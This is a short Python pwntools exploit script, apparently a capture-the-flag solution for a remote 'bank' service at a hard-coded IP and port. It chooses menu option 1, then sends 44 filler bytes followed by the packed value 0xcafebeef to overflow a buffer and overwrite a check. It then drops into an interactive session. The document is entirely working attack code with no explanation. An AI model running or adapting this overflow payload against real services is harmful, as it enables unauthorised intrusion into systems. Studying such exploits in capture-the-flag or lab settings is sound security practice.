#!/usr/bin/python3.8
from pwn import *

ip = '159.89.1.177' # change this
port = 4000 # change this
fname = './bank'

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

def pwn():
	junk = b'i'*44
	payload = junk + p64(0xcafebeef)
	sla('>', '1')
	sla('>', payload)
	inter()

if __name__ == '__main__':
	pwn()
